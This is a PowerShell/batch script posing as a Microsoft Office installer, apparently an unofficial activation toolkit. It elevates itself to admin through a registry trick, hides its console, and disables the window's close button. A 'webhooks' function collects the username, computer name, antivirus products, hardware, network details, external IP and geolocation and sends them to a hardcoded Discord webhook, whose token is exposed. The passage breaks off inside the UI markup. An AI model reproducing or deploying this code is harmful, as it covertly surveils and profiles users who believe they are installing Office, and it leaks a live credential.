<# ::
@echo off
title // MICROSOFT OFFICE INSTALLER - INDOJAVA ONLINE - HINZDC X SARGA
mode con cols=90 lines=35
color 0B

:Begin UAC check and Auto-Elevate Permissions
:-------------------------------------
REM  --> Check for permissions
echo:
echo:
echo                 Requesting Administrative Privileges...
echo:
echo                 ENABLING ADMINISTRATOR RIGHTS...
echo                 Press YES in UAC Prompt to Continue
echo.
echo		 	     Please Wait...
echo:

::# elevate with native shell by AveYo
>nul reg add hkcu\software\classes\.Admin\shell\runas\command /f /ve /d "cmd /x /d /r set \"f0=%%2\"& call \"%%2\" %%3"& set _= %*
>nul fltmc|| if "%f0%" neq "%~f0" (cd.>"%temp%\runas.Admin" & start "%~n0" /high "%temp%\runas.Admin" "%~f0" "%_:"=""%" & cls & exit /b)

    pushd "%CD%"
    CD /D "%~dp0"
cls

powershell -c "iex ((Get-Content '%~f0') -join [Environment]::Newline); iex 'main %*'"
goto :eof

#>
#-----------------------------------------------------------------------------------------
<#
    Name            : Microsoft Office Installer tools
    Version         : 1.0
    Script by       : Leo Nguyen
    Script Modified : Olih x SARGA
    Source          : https://github.com/bonguides25/PowerShell/blob/main/MSOffice/install.ps1
    Description     : This script is used to install Microsoft Office 365, 2024, 2021, 2019, 2016 and 2013 Office products.

    Version History:
    1.0, 2025-02-28 - Added Office 2025, 2024, 2021, 2019, 2016 and 2013 installation options.
#>

Add-Type -AssemblyName PresentationFramework, System.Drawing, PresentationFramework, System.Windows.Forms, WindowsFormsIntegration, PresentationCore
[System.Windows.Forms.Application]::EnableVisualStyles()
$Host.UI.RawUI.WindowTitle = '// Aurora ToolKIT Consol Log // - INDOJAVA ONLINE - HINZDC X SARGA'
$host.UI.RawUI.WindowSize = New-Object System.Management.Automation.Host.Size(90, 35)
$Host.UI.RawUI.BufferSize = New-Object System.Management.Automation.Host.Size(90, 35)

#-----------------------------------------------------------------------------------------
$ProgressPreference = 'SilentlyContinue'
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class ConsoleControl {
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    public static extern int GetWindowLong(IntPtr hWnd, int nIndex);

    [DllImport("user32.dll")]
    public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);

    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    public static extern int GetSystemMenu(IntPtr hWnd, bool bRevert);

    [DllImport("user32.dll")]
    public static extern bool RemoveMenu(int hMenu, int uPosition, int uFlags);
}
"@

# Mendapatkan handle jendela konsol saat ini
$consoleHandle = [ConsoleControl]::GetConsoleWindow()

# Mengatur constant untuk mengubah properti jendela konsol
$GWL_STYLE = -16
$WS_MAXIMIZEBOX = 0x10000
$WS_SIZEBOX = 0x40000

# Mengambil style jendela saat ini
$currentStyle = [ConsoleControl]::GetWindowLong($consoleHandle, $GWL_STYLE)

# Menghapus kemampuan untuk diubah ukurannya, dimaksimalkan dan menutup jendela
$newStyle = $currentStyle -band -bnot $WS_SIZEBOX -band -bnot $WS_MAXIMIZEBOX

# Menerapkan style baru ke jendela
[ConsoleControl]::SetWindowLong($consoleHandle, $GWL_STYLE, $newStyle) > $null

# Menyembunyikan jendela jika sudah dimodifikasi (untuk memastikan tidak ada kesalahan)
[ConsoleControl]::ShowWindow($consoleHandle, 5) > $null  # 5 = SW_SHOW

# Menghapus menu sistem (termasuk tombol Close/X)
$hMenu = [ConsoleControl]::GetSystemMenu($consoleHandle, $false)
[ConsoleControl]::RemoveMenu($hMenu, 0xF060, 0x0) > $null  # 0xF060 = SC_CLOSE (tombol Close)

function UnQuickEdit
{
	$t=[AppDomain]::CurrentDomain.DefineDynamicAssembly((Get-Random), 1).DefineDynamicModule((Get-Random), $False).DefineType((Get-Random))
	$t.DefinePInvokeMethod('GetStdHandle', 'kernel32.dll', 22, 1, [IntPtr], @([Int32]), 1, 3).SetImplementationFlags(128)
	$t.DefinePInvokeMethod('SetConsoleMode', 'kernel32.dll', 22, 1, [Boolean], @([IntPtr], [Int32]), 1, 3).SetImplementationFlags(128)
	$t.DefinePInvokeMethod('GetConsoleWindow', 'kernel32.dll', 22, 1, [IntPtr], @(), 1, 3).SetImplementationFlags(128)
	$t.DefinePInvokeMethod('SendMessageW', 'user32.dll', 22, 1, [IntPtr], @([IntPtr], [UInt32], [IntPtr], [IntPtr]), 1, 3).SetImplementationFlags(128)
	$k=$t.CreateType()
	if ($winbuild -GE 17763) {
		if ($k::SendMessageW($k::GetConsoleWindow(), 127, 0, 0) -EQ [IntPtr]::Zero) {
			return
		}
	}
	$v=(0x0080, 0x00A0)[!($winbuild -GE 10586)]
	$b=$k::SetConsoleMode($k::GetStdHandle(-10), $v)
}
UnQuickEdit
#-----------------------------------------------------------------------------------------
#-----------------------------------------------------------------------------------------
function webhooks {
    $date = (Get-Date)
    $os = Get-CimInstance -ClassName Win32_OperatingSystem
    $osVersion = "$($os.Caption) ($($os.OSArchitecture))"
    $winversion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty DisplayVersion
        if (-not $winversion) {
            $winversion = $null
        }

    $username = $env:USERNAME
    $compName = $env:COMPUTERNAME
    $language = (Get-Culture).Name

    # Ambil antivirus yang terinstall
    $antivirus = (Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntiVirusProduct).displayName -join ", "
    if (-not $antivirus) { $antivirus = "Not installed" }

    # Ambil informasi CPU, GPU, RAM
    $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystemProduct
    $Manufacturer = $computerSystem.Vendor
    $Type = $computerSystem.Version
    $Model = $computerSystem.Name

    $cpu = (Get-CimInstance Win32_Processor)
    $Name = $cpu.Name
    $Cores = $cpu.NumberOfCores
    $LogicalProcessors = $cpu.NumberOfLogicalProcessors
    $gpu = (Get-CimInstance Win32_VideoController).Name
    $ramInfo = Get-WmiObject Win32_PhysicalMemory
    $totalSizeInGB = 0
    $ramDetails = @()
    foreach ($ram in $ramInfo) {
        $sizeInGB = [math]::Round($ram.Capacity / 1GB, 2)
        $totalSizeInGB += $sizeInGB
        $ramDetails += "$($ram.Manufacturer) $sizeInGB GB ($($ram.Speed) MHz)"
    }
    $TotalSizeInGB = $totalSizeInGB
    $Modules = $ramDetails -join " -- "

    $disks = Get-CimInstance -ClassName Win32_DiskDrive
    $diskall = ""
    foreach ($disk in $disks) {
        $modeldisk = $disk.Model
        $sizeInGB = [math]::round($disk.Size / 1GB, 2)
        $diskall += "- $modeldisk - $sizeInGB GB`n"
    }
    $diskall | Out-Null

    # Ambil status baterai
    $battery = (Get-CimInstance Win32_Battery)
    $batteryStatus = if ($battery) { "$($battery.EstimatedChargeRemaining)%" } else { "NoSystemBattery" }

    # Ambil resolusi layar
    Add-Type -AssemblyName System.Windows.Forms
    $resolution = "{0}x{1}" -f [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height

    # Ambil informasi jaringan
    $gatewayIP = (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq "0.0.0.0/0" } | Select-Object -ExpandProperty NextHop)
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "Loopback" }).IPAddress
    $ip = Invoke-RestMethod -Uri "http://ip-api.com/json/"

    $wifi = Get-NetAdapter | Where-Object { $_.InterfaceDescription -match 'Wireless' -and $_.Status -eq 'Up' }
    if ($wifi) {
        $wifiName = (Get-NetConnectionProfile -InterfaceAlias $wifi.Name).Name
    } else {
        $wifiName = "No Wi-Fi connected."
    }
    $lanAdapter = Get-NetAdapter | Where-Object { $_.MediaConnectionState -eq 'Connected' -and $_.InterfaceDescription -notmatch 'Wireless' }
    if ($lanAdapter) {
        $lanStatus = "LAN connected.: $($lanAdapter.Name)"
        $pingResult = Test-Connection -ComputerName 8.8.8.8 -Count 1 -ErrorAction SilentlyContinue
        if ($pingResult.StatusCode -eq 0) {
            $internetStatus = "Internet via LAN connected."
        } else {
            $internetStatus = "Internet via LAN is not connected."
        }
    } else {
        $lanStatus = "No LAN connected."
        $internetStatus = "Internet via LAN is not available."
    }

    $WifiName = $wifiName
    $LanStatus = $lanStatus
    $InternetStatus = $internetStatus

    # URL Webhook Discord
    $webhookid = "1370237685767209070"
    $webhooktoken = "3a9GapUT5gNGgao8wKUDcKznmjx2hQ4gs1s0dkYAOoFomWAVM_--Y7iZCd13_cb4BK8v"
    $webhookUrl = "https://discord.com/api/webhooks/$webhookid/$webhooktoken"

    # URL Gambar dan Thumbnail
    #$imageUrl = "https://.../preview.png"
    #$thumbnailUrl = "https://.../preview.png"

    # Buat payload JSON dengan format embed lengkap
    $payload = @{
        username = "AuroraBot"
        #avatar_url = ""
        embeds = @(@{
            title = ":fox: AuroraToolKIT - System Report"
            description = ":key: **Microsoft Office Installer**"
            color = 3447003
            fields = @(
                @{ name = ""; value = ":calendar: $date`n"; inline = $false },
                @{ name = ":computer: **SYSTEM**"; value = "**System:** $osVersion`n**Windows Version:** $winversion`n**Username:** $username`n**CompName:** $compName`n**Language:** $language`n**Antivirus:** $antivirus `n`n"; inline = $false },
                @{ name = ":desktop: **HARDWARE**"; value = "**Manufacture:** $Manufacturer`n**Model:** $Type ($Model)`n**CPU:** $($Name) ($($Cores) Core, $($LogicalProcessors) Treads)`n**GPU:** $gpu`n**RAM:** $TotalSizeInGB GB // $Modules`n**Power:** $batteryStatus`n**Screen:** $resolution`n**Disk:**`n$diskall`n"; inline = $false },
                @{ name = ":globe_with_meridians: **NETWORK**"; value = "**SSID:** $WifiName`n**LAN:**`n$LanStatus`n**Internet Status:** $InternetStatus`n**Location:** $($ip.country),  $($ip.city), $($ip.regionName) ($($ip.zip))`n**Gateway IP:** $gatewayIP`n**Internal IP:** $localIP`n**External IP:** $($ip.query)"; inline = $false },
                @{ name = ""; value = "-----------------------------------------------"; inline = $false },
                @{ name = "**:green_circle: ACTIVATION STATUS**"; value = " `n`n$(CheckOhook)`n"; inline = $false }
                
            )
            #thumbnail = @{ url = $thumbnailUrl }
            #image = @{ url = $imageUrl }
            footer = @{ text = "AuroraBot | PowerShell Script" }
            timestamp = Get-Date -Format o
        })
    } | ConvertTo-Json -Depth 10

    # Kirim ke Discord Webhook
    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
}
#-----------------------------------------------------------------------------------------
[Console]::OutputEncoding = [System.Text.Encoding]::utf8
Clear-Host
# ASCII Art dalam Unicode [char]
$colors = @("Blue", "Cyan", "Magenta", "Red")
$randomColor = Get-Random -InputObject $colors
$randomColor2 = Get-Random -InputObject $colors
$text = @"

                                                  $([char]0x2554)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2557)
         $([char]0x2554)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2563)  OLIH X SARGA A.K.A HINZDC  $([char]0x2551)
         $([char]0x2551)                                        $([char]0x255A)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2563)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2591)  $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2591)  $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2592)$([char]0x2592) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)                                                                      $([char]0x2551)
         $([char]0x2551)        $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x255A)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2566)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x2569)$([char]0x255D) $([char]0x2588)$([char]0x2588)       $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)         $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)       $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2591)$([char]0x2591)    $([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588) $([char]0x2584) $([char]0x2588)$([char]0x2588)$([char]0x2566)$([char]0x2588)$([char]0x2588) $([char]0x2584) $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)       $([char]0x2588)$([char]0x2588)$([char]0x2588)     $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)$([char]0x2569)$([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)       $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)           $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2591) $([char]0x2591)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)$([char]0x2588)  $([char]0x2588)$([char]0x2588)   $([char]0x2588)$([char]0x2588) $([char]0x2588)$([char]0x2588)    $([char]0x2588)$([char]0x2588)            $([char]0x2551)
         $([char]0x2551)                    $([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x255D) $([char]0x255A)$([char]0x2550)$([char]0x2550)$([char]0x2550)                                         $([char]0x2551)
         $([char]0x255A)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2550)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x2564)$([char]0x255D)
"@
Write-Host $text -ForegroundColor $randomColor
Write-Host "                          ----- MICROSOFT OFFICE INSTALLER -----" -ForegroundColor $randomColor2
Write-Host "------------------------------------------------------------------------------------------"
Write-Host "   SERVICE - SPAREPART - UPGRADE - MAINTENANCE - INSTALL ULANG - JUAL - TROUBLESHOOTING   " -ForegroundColor red
Write-Host "------------------------------------------------------------------------------------------"
Write-Host
Write-Host "  > AURORA TOOLKIT" -ForegroundColor Yellow
Write-Host "  > Version 1.0" -ForegroundColor Yellow
Write-Host "  > Created by: Olih x SARGA" -ForegroundColor Yellow
#----------------------------------------------
Write-Host
Write-Host " Launch Microsoft Office Installer Tool" -NoNewline
for ($i = 0; $i -lt 10; $i++) {
    Write-Host -NoNewline "."; Start-Sleep -Milliseconds 300
}
Write-Host


$WinAPI = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
"@ -Name "WinAPI" -Namespace "API" -PassThru

$hwnd = $WinAPI::GetConsoleWindow()

# Sembunyikan jendela
$WinAPI::ShowWindow($hwnd, 0) | Out-Null
# Fungsi untuk mendapatkan tema sistem
function Get-SystemTheme {
    $theme = Get-ItemPropertyValue -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize" -Name "AppsUseLightTheme" -ErrorAction SilentlyContinue
    if ($theme -eq 1) {
        return "Light"
    } else {
        return "Dark"
    }
}

# Fungsi untuk menerapkan tema ke semua elemen UI
function Apply-Theme($Form, $currentTheme) {
# Pastikan form memiliki Resources
if ($Form.Resources -eq $null) {
    $Form.Resources = New-Object System.Windows.ResourceDictionary
}

# Fungsi untuk memperbarui warna pada SolidColorBrush di Resources
function Set-BrushColor($key, $hexColor) {
    # Ambil brush yang ada di Resources
    $brush = $Form.Resources[$key]
    
    if ($brush -is [System.Windows.Media.SolidColorBrush]) {
        # Konversi HEX ke Color
        $color = [System.Windows.Media.ColorConverter]::ConvertFromString($hexColor)
        
        # Ubah warna brush yang sudah ada
        $brush.Color = $color
    } else {
        Write-Host "Resource dengan key '$key' tidak ditemukan atau bukan SolidColorBrush."
    }
}

# Terapkan tema berdasarkan kondisi
if ($currentTheme -eq "Dark") {
    Set-BrushColor "BackgroundColor" "#121212"
    Set-BrushColor "TextColor" "#E0E0E0"        # Putih
    Set-BrushColor "ButtonBackground" "#444444" # Abu-abu gelap
    Set-BrushColor "BorderBackgroud" "#383838"  # Abu-abu tua
    Set-BrushColor "ShadowColor" "#222222"      # Bayangan gelap
    Set-BrushColor "CanvasColor" "#1e1e1e"      
} else {
    Set-BrushColor "BackgroundColor" "#dde4e6"
    Set-BrushColor "TextColor" "#000000"        # Hitam
    Set-BrushColor "ButtonBackground" "#D3D3D3" # Light Gray
    Set-BrushColor "BorderBackgroud" "#FFFFFF"  # Putih
    Set-BrushColor "ShadowColor" "#D3D3D3"      # Light Gray
    Set-BrushColor "CanvasColor" "white"      
}

# Pastikan perubahan warna langsung terlihat
$Form.InvalidateVisual()

}

Write-Host
Start-Sleep -Seconds 2
Write-Host " Launch Microsoft Office Installer Tool" -NoNewline
for ($i = 0; $i -lt 10; $i++) {
    Write-Host -NoNewline "."; Start-Sleep -Milliseconds 300
}
Write-Host

$WinAPI = Add-Type -MemberDefinition @"
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

[DllImport("kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
"@ -Name "WinAPI" -Namespace "API" -PassThru

$hwnd = $WinAPI::GetConsoleWindow()

# Sembunyikan jendela
$WinAPI::ShowWindow($hwnd, 0) | Out-Null


$xamlinput = @'
<Window x:Class="OfficeInstaller.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        xmlns:local="clr-namespace:OfficeInstaller"
        mc:Ignorable="d"
        MaxWidth="1160"
        MaxHeight="570"
        MinWidth="1160"
        MinHeight="518"
        Height="520" Width="1160"
        WindowStartupLocation="CenterScreen"
        Title="Microsoft Installation Tool // HINZDC X SARGA // ISTANA BEC BANDUNG - WhatsApp 085157919957"
        Icon="https://raw.githubusercontent.com/hinzdc/get/refs/heads/main/image/Microsoft.png">

    <Window.Resources>
        <!-- Warna sebagai resource -->
        <SolidColorBrush x:Key="BackgroundColor" Color="#eef4f9"/>
        <SolidColorBrush x:Key="TextColor" Color="Black"/>
        <SolidColorBrush x:Key="ButtonBackground" Color="LightGray"/>
        <SolidColorBrush x:Key="BorderBackgroud" Color="white"/>
        <SolidColorBrush x:Key="ShadowColor" Color="LightGray"/>
        <SolidColorBrush x:Key="CanvasColor" Color="White"/>


        <!-- Style dasar -->
        <Style x:Key="BaseRoundedButtonStyle" TargetType="Button">
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Border Background="{TemplateBinding Background}" 
                                BorderBrush="{TemplateBinding BorderBrush}" 
                                BorderThickness="1" CornerRadius="3">
                            <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
                        </Border>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
            <Setter Property="FontFamily" Value="Consolas"/>
            <Setter Property="Foreground" Value="White"/>
            <Setter Property="UseLayoutRounding" Value="True"/>
            <Setter Property="BorderBrush" Value="Transparent"/>
            <!-- Default Border -->

            <!-- Efek Hover Universal -->
            <Style.Triggers>
                <Trigger Property="IsMouseOver" Value="True">
                    <Setter Property="Opacity" Value="0.8"/>
                </Trigger>
            </Style.Triggers>
        </Style>

        <!-- Style Hijau -->
        <Style x:Key="GreenButtonStyle"
       TargetType="Button"
       BasedOn="{StaticResource BaseRoundedButtonStyle}">
            <!-- warna -->
            <Setter Property="Background" Value="#FF168E12"/>
            <Setter Property="BorderBrush" Value="#0F6E0D"/>
            <Setter Property="BorderThickness" Value="1"/>
            <Setter Property="Foreground" Value="White"/>
            <Setter Property="Padding" Value="12,8"/>

            <!-- sudut bulat lewat template -->
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="Button">
                        <Border x:Name="bd"
                        Background="{TemplateBinding Background}"
                        BorderBrush="{TemplateBinding BorderBrush}"
                        BorderThickness="{TemplateBinding BorderThickness}"
                        CornerRadius="10">
                            <!-- ⬅️ ini yang bikin rounded -->
                            <ContentPresenter Margin="{TemplateBinding Padding}"
                                      HorizontalAlignment="{TemplateBinding HorizontalContentAlignment}"
                                      VerticalAlignment="{TemplateBinding VerticalContentAlignment}"
                                      RecognizesAccessKey="True"/>
                        </Border>

                        <!-- efek interaksi optional -->
                        <ControlTemplate.Triggers>
                            <Trigger Property="IsMouseOver" Value="True">
                                <Setter TargetName="bd" Property="Background" Value="#FF1DAA18"/>
                            </Trigger>
                            <Trigger Property="IsPressed" Value="True">
                                <Setter TargetName="bd" Property="Background" Value="#FF0F7D0C"/>
                            </Trigger>
                            <Trigger Property="IsEnabled" Value="False">
                                <Setter TargetName="bd" Property="Opacity" Value="0.6"/>
                            </Trigger>
                        </ControlTemplate.Triggers>
                    </ControlTemplate>
                </Setter.Value>
            </Setter>
        </Style>

        <!-- Style Oranye -->
        <Style x:Key="OrangeButtonStyle" BasedOn="{StaticResource BaseRoundedButtonStyle}" TargetType="Button">
            <Setter Property="Background" Value="#FFE23B15"/>
        </Style>

        <!-- Style Merah -->
        <Style x:Key="RedButtonStyle" BasedOn="{StaticResource BaseRoundedButtonStyle}" TargetType="Button">
            <Setter Property="Background" Value="#FFE23B15"/>
        </Style>

        <!-- Style Grey -->
        <Style x:Key="GreyButtonStyle" BasedOn="{StaticResource BaseRoundedButtonStyle}" TargetType="Button">
            <Setter Property="Background" Value="#808080"/>
        </Style>

        <!-- Style untuk ToolTip -->
        <Style TargetType="ToolTip">
            <Setter Property="Background" Value="#2D2D30"/>
            <Setter Property="Foreground" Value="White"/>
            <Setter Property="FontSize" Value="11"/>
            <Setter Property="Padding" Value="10"/>
            <Setter Property="BorderBrush" Value="Gray"/>
            <Setter Property="BorderThickness" Value="1"/>
            <Setter Property="Effect">
                <Setter.Value>
                    <DropShadowEffect BlurRadius="10" Color="Black" ShadowDepth="3"/>
                </Setter.Value>
            </Setter>
        </Style>

        <Storyboard x:Key="BlinkTextAnimation" RepeatBehavior="Forever">
            <ColorAnimation Storyboard.TargetProperty="(TextBox.Foreground).(SolidColorBrush.Color)"
                        From="Black" To="Transparent" Duration="0:0:2" AutoReverse="True"/>
        </Storyboard>

        <!-- Style untuk TextBox Berkedip -->
        <Style x:Key="BlinkingTextBoxStyle" TargetType="TextBox">
            <Setter Property="Foreground">
                <Setter.Value>
                    <SolidColorBrush Color="Red"/>
                    <!-- Warna awal -->
                </Setter.Value>
            </Setter>
            <Style.Triggers>
                <EventTrigger RoutedEvent="TextBox.Loaded">
                    <BeginStoryboard Storyboard="{StaticResource BlinkTextAnimation}"/>
                </EventTrigger>
            </Style.Triggers>
        </Style>
        <Storyboard x:Key="RotateStoryboard">
            <DoubleAnimation 
                Storyboard.TargetProperty="(UIElement.RenderTransform).(RotateTransform.Angle)"
                From="0" To="360" Duration="0:0:5" RepeatBehavior="Forever" />
        </Storyboard>

        <!-- Style RadioButton -->
        <Style x:Key="CustomRadioButtonStyle" TargetType="RadioButton">
            <Setter Property="FontFamily" Value="Consolas"/>
            <Setter Property="FontSize" Value="11"/>
            <Setter Property="Foreground" Value="{DynamicResource TextColor}"/>
            <Setter Property="Margin" Value="5"/>
            <Setter Property="Template">
                <Setter.Value>
                    <ControlTemplate TargetType="RadioButton">
                        <StackPanel Orientation="Horizontal">
                            <Border Width="12" Height="12"
                                BorderBrush="{TemplateBinding Foreground}"
                                BorderThickness="1"
                                CornerRadius="8"
                                Background="#8f8e94">
                                <Ellipse Width="7" Height="7" 
                                    Fill="#0c7af5" 
                                    Visibility="Collapsed"
                                    x:Name="checkMark"/>
                            </Border>
                            <TextBlock Text="{TemplateBinding Content}" 
                                   VerticalAlignment="Center"
                                   Margin="5,0,0,0"
                                   Foreground="{TemplateBinding Foreground}"/>
